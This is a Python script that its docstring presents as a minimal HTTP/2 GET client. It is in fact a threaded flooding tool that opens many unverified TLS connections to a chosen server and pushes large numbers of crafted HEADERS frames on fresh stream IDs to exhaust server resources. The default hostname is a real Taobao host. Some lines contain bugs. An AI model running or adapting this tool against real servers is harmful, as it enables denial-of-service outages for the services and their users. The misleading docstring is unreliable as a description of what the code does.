#!/usr/bin/env python3
# encoding: utf-8

"""
plain_sockets_client.py
~~~~~~~~~~~~~~~~~~~~~~

Just enough code to send a GET request via h2 to an HTTP/2 server and receive a response body.
This is *not* a complete production-ready HTTP/2 client!
"""
import time
import socket
import ssl
import certifi

import h2.connection
import h2.events
import struct
import ctypes 

import random
from urllib.parse import urlparse

import sys

SERVER_NAME = 'acs.m.taobao.com'
SERVER_PORT = 2080
DEFAULT_SIZE = 1200
SERVER_IP = "127.0.0.1"

TYPE_HEADER = 1
FRAME_FLAG = 5

"""
+-----------------------------------------------+
|                 Length (24)                   |
+---------------+---------------+---------------+
|   Type (8)    |   Flags (8)   |
+-+-------------+---------------+-------------------------------+
|R|                 Stream Identifier (31)                      |
+=+=============================================================+
|                   Frame Payload (0...)                      ...
+---------------------------------------------------------------+
"""
# date_len + type + flag + id
FRAME_HEADER_LEN = 3 + 1 + 1 + 4

FIRST_REQ_FRAME_HEADER = [0x87, 0x82]
REQ_FRAME_HEADER = [0x87, 0x82, 0xBE, 0xBF]
HOST_PACK_VALUE = 0x41
PATH_PACK_VALUE = 0x44

def generate_random_string(length):
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    random_string = ''.join(random.choice(chars) for _ in range(length))
    return random_string

class ReqData():
    #sendbuf = ctypes.create_string_buffer(DEFAULT_BUFFER_SIZE)
    frame_data = b""
    def __init__(self, f_type, flag, s_id, data):
        if (type(data) != 'bytes'):
            print("data type error:%s"%type(data))
            return
        if len(data) > 0:
            data_len = len(data)
        else:
            data_len = 0
        frame_len = FRAME_HEADER_LEN + data_len
        #self.sendbuf = struct.packin(
        b_frame = struct.pack("BBBBB!I", frame_len >> 16, frame_len >> 8, frame_len >> 0, f_type, flag, s_id)
        self.frame_data = b_frame + data
    

class H2Request():
    def __init__(self, url, server_port = SERVER_PORT, server_ip = SERVER_IP):
        self.url = url
        u = urlparse(url)
        self.hostname = u.netloc
        self.path = u.path
        self.query = u.query
        self.server_ip = server_ip
        self.serverport = server_port
        socket.setdefaulttimeout(1)
        self.ctx = ssl._create_unverified_context()
        self.ctx.set_alpn_protocols(['h2'])
        self.s = socket.create_connection((server_ip, server_port))
        self.s = self.ctx.wrap_socket(self.s, server_hostname=self.hostname)
        self.c = h2.connection.H2Connection()
        self.c.initiate_connection()
        self.s.sendall(self.c.data_to_send())
  
    #不支持huffman编码, 将data 和其长度编码成二进制
    def make_header_value(self, data, prefix, prefix_len):
        #print(type(data), data)
        data_len = len(data)
        b_data_len = b''
        N = 8 - prefix_len
        M = (1 << N) - 1
        if data_len < M:
            b_data_len = struct.pack("B", data_len|prefix)
            return b_data_len + data
        b_data_len = struct.pack("B", prefix|M)
        data_len = data_len - M
        while(data_len > 127):
            b_data_len += struct.pack("B", data_len & 0x7f | 0x80)
            data_len = data_len >> 7
        if (data_len > 0):
            b_data_len += struct.pack("B", data_len)

        return b_data_len + data

    def construct_first_header_frame(self, uri_size):
        uri = self.path.encode() + b'?' + self.query.encode()
        if (len(uri) < uri_size):
            pad_size = uri_size - len(uri)
            #print(pad_size)
            uri_pad = generate_random_string(pad_size)
            uri = uri + uri_pad.encode()
        
        prefix = 0x0
        prefix_len = 1
        b_host_value = self.make_header_value(self.hostname.encode(), prefix, prefix_len)
        b_uri_value = self.make_header_value(uri, prefix, prefix_len)
       
        b_host_header_data = struct.pack("B", HOST_PACK_VALUE) + b_host_value
        b_uri_header_data = struct.pack("B", PATH_PACK_VALUE) + b_uri_value
        b_frame_data = struct.pack("B", FIRST_REQ_FRAME_HEADER[0]) + struct.pack("B", FIRST_REQ_FRAME_HEADER[1]) + \
                b_host_header_data + b_uri_header_data
        #print(b_frame_data)
        return b_frame_data
    
    def construct_attack_header_frame(self, stream_id, b_header_data):
        frame_len = len(b_header_data)
        r_0 = struct.pack("B", (frame_len & 0xFF0000) >> 16)    
        r_1 = struct.pack("B", (frame_len & 0xFF00) >> 8)
        r_2 = struct.pack("B", frame_len & 0xFF)
        r_3 = struct.pack("B", TYPE_HEADER)
        r_4 = struct.pack("B", FRAME_FLAG)
        r_5 = struct.pack("I", socket.htonl(stream_id))
        frame_data = r_0 + r_1 + r_2 + r_3 + r_4 + r_5 + b_header_data
        return frame_data

    def construct_attack_request_data(self, max_stream):
        request_data = b""
        
        header_data = REQ_FRAME_HEADER 
            
        b_header_data = b""
        for ele in header_data:
            b_header_data += struct.pack("B", ele)

        for i in range(1, max_stream):
            stream_id = 1 + 2*i
            request_data += self.construct_attack_header_frame(stream_id, b_header_data)
       
        return request_data

    def construct_first_request(self, uri_size):
        header_frame = self.construct_first_header_frame(uri_size)
        frame_len = len(header_frame) 
        
        r_0 = struct.pack("B", (frame_len & 0xFF0000) >> 16)
        r_1 = struct.pack("B", (frame_len & 0xFF00) >> 8)
        r_2 = struct.pack("B", frame_len & 0xFF)
        r_3 = struct.pack("B", TYPE_HEADER)
        r_4 = struct.pack("B", FRAME_FLAG)
        stream_id = 1
        r_5 = struct.pack("I", socket.htonl(stream_id))
        #print(r_5)
        request_data = r_0 + r_1 + r_2 + r_3 + r_4 + r_5 + header_frame
        return request_data
        
    def send_first_header(self, uri_size):
        header_frame = self.construct_first_request(uri_size)
        self.s.sendall(header_frame)

        body = b''
        response_stream_ended = False
        #while not response_stream_ended:
            # read raw data from the socket
            #data = self.s.recv(65536 * 1024)
            #break
    def send_attack_header(self, max_stream):
        request_data = self.construct_attack_request_data(max_stream)
        self.s.sendall(request_data)

    def close_connection(self):
        self.c.close_connection()
        self.s.sendall(self.c.data_to_send())
        self.s.close()

import _thread

def thread_run(url, conn, max_stream, server_ip, server_port):
    if conn == 0:
        conn = 1
    interval = 1.0/conn
    
    conn_count = 0
    l_time = int(time.time())
   
    
    conn_list = []
    while (True):
        conn_count += 1
        if (conn_count > 100 * conn):
            break
        if time.time() - l_time > 10:
            l_time = int(time.time())
            print(time.strftime("%H:%M:%S", time.localtime(time.time())))
            print("total connetion:%d"%conn_count)
        try:
            h2r = H2Request(url = url, server_port = server_port, server_ip = server_ip)
            h2r.send_first_header(1200)
            h2r.send_attack_header(max_stream)
            time.sleep(interval)
            conn_list.append(h2r)
            if len(conn_list > conn):
                conn_list[0].close_connection()
                conn_list.remove(conn_list[0])
        
        except:
            continue
  
        

if __name__ == "__main__":
    #args = sys.argv[:]
    argv = sys.argv[:]
    if len(argv) == 7:
        url = argv[1]
        conn = int(argv[2])
        max_stream = int(argv[3])
        thread_num = int(argv[4])
        server_ip = argv[5]
        server_port = int(argv[6])

    elif len(argv) == 5:
        url = argv[1]
        conn = int(argv[2])
        max_stream = int(argv[3])
        thread_num = int(argv[4])
        server_ip = SERVER_IP
        server_port = SERVER_PORT
    else:
        print("useage: program url max_conn stream_per_conn thread_num (server_ip) (server_port)")
        print(sys.argv)
        sys.exit(0)

    for i in range(0, conn):
        _thread.start_new_thread(thread_run, (url, conn, max_stream, server_ip, server_port))

    while 1:
        pass

